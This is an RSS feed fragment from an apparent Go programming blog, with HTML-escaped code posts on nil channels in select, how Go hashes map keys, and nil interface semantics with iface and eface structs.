&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;time&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">inch&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">outch&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// (0) `in != nil`
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">in&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">inch&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">out&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">val&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// enable and disable `out`, `in`
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">select&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// (1)(3) out == nil =&amp;gt; { blocking }
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// (2)(4) out != nil =&amp;gt; { out &amp;lt;- val; in != nil }
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="nx">out&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">val&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">in&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">inch&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// (1)(3) in != nil =&amp;gt; { out != nil; val &amp;lt;- in; in == nil }
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// (2)(4) in == nil =&amp;gt; { blocking }
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="nx">val&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">in&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">outch&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">in&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// (1) blocking
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// (2) result: 1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// (3) blocking
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// (4) result: 2
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">outch&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;result:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">inch&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">inch&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="mi">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Second&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ref">ref&lt;/h3>
&lt;p>&lt;a class="link" href="http://devs.cloudimmunity.com/gotchas-and-common-mistakes-in-go-golang/index.html" target="_blank" rel="noopener"
>http://devs.cloudimmunity.com/gotchas-and-common-mistakes-in-go-golang/index.html&lt;/a>&lt;/p></description></item><item><title>How does go calculate a hash value for keys in a map?</title><link>https://resyon.netlify.app/p/how-does-go-calculate-a-hash-value-for-keys-in-a-map/</link><pubDate>Sun, 10 Oct 2021 15:27:19 +0800</pubDate><guid>https://resyon.netlify.app/p/how-does-go-calculate-a-hash-value-for-keys-in-a-map/</guid><description>&lt;h1 id="how-does-go-calculate-a-hash-value-for-keys-in-a-map">How does go calculate a hash value for keys in a map?&lt;/h1>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://stackoverflow.com/questions/37625480/how-does-go-calculate-a-hash-value-for-keys-in-a-map" target="_blank" rel="noopener"
>ref&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h2 id="original">original&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>The language spec doesn&amp;rsquo;t say, which means that it&amp;rsquo;s free to change at any time, or differ between implementations.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The hash algorithm varies somewhat between types and platforms. As of now: On x86 (32 or 64 bit) if the CPU supports AES instructions, the runtime uses aeshash, a hash built on AES primitives, otherwise it uses a function &amp;ldquo;inspired by&amp;rdquo; xxHash and cityhash, but different from either. There are different variants for 32-bit and 64-bit systems. Most types use a simple hash of their memory contents, but floating-point types have code to ensure that 0 and -0 hash equally (since they compare equally) and NaNs hash randomly (since two NaNs are never equal). Since complex types are built from floats, their hashes are composed from the hashes of their two floating-point parts. And an interface&amp;rsquo;s hash is the hash of the value stored in the interface, and not the interface header itself.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>All of this stuff is in private functions, so no, you can&amp;rsquo;t access Go&amp;rsquo;s internal hash for a value in your own code.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>if two things compare equal with == they must have equal hashes (or maps wouldn&amp;rsquo;t work&amp;hellip; this is also the reasoning behind all of the special cases I outlined above). That means that strings hash their bodies, not their headers. And structs compose the hashes of all of their fields. I can&amp;rsquo;t find the code actually implementing that, but the tests and the comparison rules make it clear.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="summary">summary&lt;/h2>
&lt;ol>
&lt;li>平台/体系结构相关, &lt;code>func hash&lt;/code>绑定至&lt;code>_type.alg&lt;/code>中, &lt;code>x86&lt;/code>下且支持&lt;code>AES&lt;/code>指令使用基于&lt;code>AES&lt;/code>原语的&lt;code>aeshash&lt;/code>, 否则&amp;hellip;&lt;/li>
&lt;li>&lt;code>float&lt;/code>的计算方式比较特殊, 由于&lt;code>IEEE-754&lt;/code>.&lt;/li>
&lt;li>&lt;code>interface&lt;/code>的哈希根据存储其中的&lt;code>hash value&lt;/code>计算出, 而非头部&lt;/li>
&lt;li>&lt;code>string&lt;/code>, &lt;code>struct&lt;/code> 的哈希值由构成他们的域/字符计算得出, 而非头部&lt;/li>
&lt;li>&lt;code>golang&lt;/code>定义的&lt;code>hash&lt;/code>均为私有, 但可以通过&lt;code>==&lt;/code>推断二者的&lt;code>hash value&lt;/code>是否相等, &lt;a class="link" href="https://golang.org/ref/spec#Comparison_operators" target="_blank" rel="noopener"
>但注意 &lt;code>slice&lt;/code>, &lt;code>map&lt;/code>, &lt;code>func&lt;/code>, &lt;code>带有前面3者的array &amp;amp;&amp;amp; struct&lt;/code>不可比较&lt;/a>&lt;/li>
&lt;/ol></description></item><item><title>golang nil interface</title><link>https://resyon.netlify.app/p/golang-nil-interface/</link><pubDate>Sat, 09 Oct 2021 17:47:39 +0800</pubDate><guid>https://resyon.netlify.app/p/golang-nil-interface/</guid><description>&lt;h1 id="golang-nil-interface">golang nil interface&lt;/h1>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://golang.design/go-questions/interface/dynamic-typing/" target="_blank" rel="noopener"
>ref&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h2 id="preparation-structure-of-interface-entry">preparation: structure of interface entry&lt;/h2>
&lt;h3 id="common-interface">common interface&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">iface&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">tab&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">itab&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">data&lt;/span> &lt;span class="nx">unsafe&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Pointer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">itab&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">inter&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">interfacetype&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_type&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">_type&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">link&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">itab&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">hash&lt;/span> &lt;span class="kt">uint32&lt;/span> &lt;span class="c1">// copy of _type.hash. Used for type switches.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">bad&lt;/span> &lt;span class="kt">bool&lt;/span> &lt;span class="c1">// type does not implement interface
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">inhash&lt;/span> &lt;span class="kt">bool&lt;/span> &lt;span class="c1">// has this itab been added to hash?
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">unused&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kt">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fun&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kt">uintptr&lt;/span> &lt;span class="c1">// variable sized
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">interfacetype&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">typ&lt;/span> &lt;span class="nx">_type&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pkgpath&lt;/span> &lt;span class="nx">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">mhdr&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">imethod&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="interface">&lt;code>interface{}&lt;/code>&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">eface&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_type&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">_type&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">data&lt;/span> &lt;span class="nx">unsafe&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Pointer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="nil">&lt;code>nil&lt;/code>&lt;/h2>
&lt;blockquote>
&lt;p>interface nil := type == nil &amp;amp;&amp;amp; data == nil
struct nil := data == nil&lt;/p>
&lt;/blockquote>
&lt;h3 id="common-interface-1">common interface&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">Coder&lt;/span> &lt;span class="kd">interface&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">code&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">Gopher&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span> &lt;span class="nx">Gopher&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">code&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="nx">Coder&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;c: %T, %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// c: &amp;lt;nil&amp;gt;, &amp;lt;nil&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">g&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Gopher&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// declare an interface `g`, type of `g` is still `nil`
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;g: %T, %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">g&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">g&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// g: *main.Gopher, &amp;lt;nil&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// assign interface `c` struct type `g`
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">g&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;c: %T, %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// c: *main.Gopher, &amp;lt;nil&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>output&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">true
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">c: &amp;lt;nil&amp;gt;, &amp;lt;nil&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">true
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">g: *main.Gopher, &amp;lt;nil&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">c: *main.Gopher, &amp;lt;nil&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="interface-1">&lt;code>interface{}&lt;/code>&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
